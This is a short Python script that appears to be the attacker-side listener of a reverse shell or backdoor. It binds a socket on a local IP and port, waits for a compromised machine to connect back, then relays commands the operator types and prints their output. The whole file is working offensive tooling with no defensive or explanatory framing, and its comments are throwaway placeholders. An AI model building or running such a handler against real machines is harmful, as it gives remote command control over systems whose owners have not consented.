import socket

class back:
    '''Create a Class..!'''

    def __init__(self, ip, ports):
        '''this is a function'''
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, ports))
        listener.listen(0)
        print("[+] Wating for incoming Connections")
        self.connected, addres = listener.accept()
        print("[+] Get a Connection" + str(addres))

    def command_send(self, comnd):
        self.connected.send(comnd)

    def command(self):
        '''Define a Function'''
        return self.connected.recv(1024)


    def run(self):
        '''function number tow'''
        while True:
            user_command = input(">>")
            self.command_send(user_command.encode())
            re_valu = self.command()
            print(re_valu.decode())



listenr = back("192.168.0.102", 8080)
listenr.run()





